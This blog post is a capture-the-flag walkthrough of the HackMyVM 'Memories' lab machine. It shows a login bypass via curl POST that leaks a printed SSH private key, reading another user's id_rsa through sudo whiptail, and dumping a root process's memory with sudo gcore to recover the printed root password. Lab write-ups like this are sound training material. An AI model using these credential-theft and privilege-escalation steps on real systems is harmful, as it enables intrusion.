---
layout: post
author: kohaku
title:  "Memories"
date:   2022-01-01 10:28:30 PM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Memories)

# Enumeration

{% highlight text  %}
# Nmap 7.92 scan initiated Thu Dec 30 16:40:37 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.203
Nmap scan report for 192.168.0.203
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 d3:66:a3:0a:23:d3:46:e1:e6:6c:ff:ef:2d:0d:ad:7c (RSA)
|   256 93:35:93:8f:6b:7b:1f:11:ce:3a:db:09:15:a5:e1:ac (ECDSA)
|_  256 36:4e:cb:29:6d:64:19:49:15:47:d0:68:d4:0f:c6:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 16:40:44 2021 -- 1 IP address (1 host up) scanned in 7.61 seconds
{% endhighlight  %}

# Port 80

We can see a default apache page

## Fuzzing

{% highlight text  %}
/robots.txt           (Status: 200) [Size: 11]
{% endhighlight  %}

On robots.txt we can see another directory `/memories`  

![Untitled](/images/memories/loginPage.png)

I tried to found the creds, but i don’t find anything

But we can bypass this login 

{% highlight bash  %}
curl -X POST "192.168.0.203/memories/index.html"
{% endhighlight  %}

{% highlight text  %}
#Laura private key
laura
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA2W+WidI/grDh9S7BHggHhYFtusWhcArliwIzfEUbjxI+YSMxaCpR
PmPQHVy9dMWW0Joml9ShJiH8m2STT4vH36vyWpgBmZRAgm3lnfc/CzOzI+onbJ8IkfQiG0
RAnGowyax9qB1JYz07lYqlEsnYA39M98yLNtYZnO7cbAFp6vOz82LCQFm3JoOENmkQQlzG
kx0tI9sDtDHgAughL+Gig23nEFcJVYZlms1vwFbTBV3QafbxSmstIdgr4CfODM/tKjTPMD
dTqFEf5CEi+3cFiNBRr4FVfsb2otaOwzZ5mSgzsZ/WvuGZ1lnrrSb61J5aH6/3w/3/5TEK
BCtMDc5fSwAAA8he+yvgXvsr4AAAAAdzc2gtcnNhAAABAQDZb5aJ0j+CsOH1LsEeCAeFgW
26xaFwCuWLAjN8RRuPEj5hIzFoKlE+Y9AdXL10xZbQmiaX1KEmIfybZJNPi8ffq/JamAGZ
lECCbeWd9z8LM7Mj6idsnwiR9CIbRECcajDJrH2oHUljPTuViqUSydgDf0z3zIs21hmc7t
xsAWnq87PzYsJAWbcmg4Q2aRBCXMaTHS0j2wO0MeAC6CEv4aKDbecQVwlVhmWazW/AVtMF
XdBp9vFKay0h2CvgJ84Mz+0qNM8wN1OoUR/kISL7dwWI0FGvgVV+xvai1o7DNnmZKDOxn9
a+4ZnWWeutJvrUnlofr/fD/f/lMQoEK0wNzl9LAAAAAwEAAQAAAQAMm4PHCgHUuhzf8o4Q
B7cn7pFGOx9ZN8iHfuEtW3R1n0EusLO0rn93dqIikbYKh0pvXgDO3O1bIK1c9T/1ZM16Eq
ZCyn2NQiNbbLPbrPJi2+SPOIyAp9f/XoB7xEFa0G1zxCSlEs2mi25hBWD87ecwjLkRxTJt
Q4zIpLDzMkHJ9awYwCkweO2Oq3ia4L01nSXEAnhNfC074LT/mvvmOWebB37i0WHXn2iLMO
ab2yF4GWZcsVaU3DC08ZQHEOn/98xEV/22SLhlqxzK/XPk2XK/e2Egdg3qM3s9QDvzv1Qj
WSp+MVnbezr+e6qPwLmDHAtLY34U6fMDndcautebRNDBAAAAgEtUAUhMxTiu2c0wASGDrC
+/kcLSJhUg8p96546I20cMsmJiYZUH/hFITe4mzhehrYx74XJu9UePpvf7nePAFcHpKZki
Uf2p86G1/zQf4ti0a5h6Udbyon9d7Z6gq38loJoeYbyqCoBAO93ZgdxzbGZd0sLiSEeSNa
98kUV8oYPCAAAAgQD6dbOG9CnC8Y4Bl2J8/1JFWLh9YoZfQd5G+NsJrGiMlQjBgtPemsdQ
11Z0l6VSQhPMtQFbvHhpYwzFDNQbfRbkZgenQ8JDL5lEkZ7T8bkhtakZwMOIM9ewyN92eU
MiIFaBPKZ9PXxSYcnQcW2iGa8xwlIO0wg4kNDPARSmrBOZ1wAAAIEA3j7hORliNXJUafDa
6iSzgbBoKy1bdyvc+GlyLYdtYAHblglzwy8TJUu4nIXQZzb4MrlKhG32s4AfaXoRVc2Uo7
RCk0pW+N3Nyao0xod+3DeGCD8ZiEpNON4K9HM6fY6PA1ecpbXepR3h9LzZmSVFfyxngw2F
rrO2R16UEDh4v60AAAAObGF1cmFAbWVtb3JpZXMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
{% endhighlight  %}

# User

Connect to laura using the private key

{% highlight bash  %}
sudo -l

User laura may run the following commands on memories:
    (lucy) NOPASSWD: /usr/bin/whiptail
{% endhighlight  %}

Getting Lucy private key

{% highlight bash  %}
sudo -u lucy  whiptail --textbox --scrolltext /home/lucy/.ssh/id_rsa 0 0
{% endhighlight  %}

Copy and change the chmod to 600

# Root

On Lucy user, run:

{% highlight bash  %}
sudo -l

User lucy may run the following commands on memories:
    (ALL : ALL) NOPASSWD: /usr/bin/gcore
{% endhighlight  %}

With gcore binary we can generate a core file for a running process

Using the pspy64 program: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

Run this binary and watch the process 

{% highlight bash  %}
#This is a interesting one
2021/12/30 17:45:01 CMD: UID=0    PID=11885  | /bin/sh -c /root/memories
{% endhighlight  %}

This process is schedule to be execute every minute through crontab

We can create a script to wait until the process execute and grep it

{% highlight bash  %}
while true; do i=$(ps -ef | grep /root/memories |grep -v grep | awk -F " " '{print $2}'); sudo gcore $i -o $(date); done
{% endhighlight  %}

This script grep the name of the process and the pid, after that calls the gcore with the right pid

Run strings against the files 

{% highlight bash  %}
strings core.* | grep password
My password is whataboutyourthinking
{% endhighlight  %}

root:whataboutyourthinking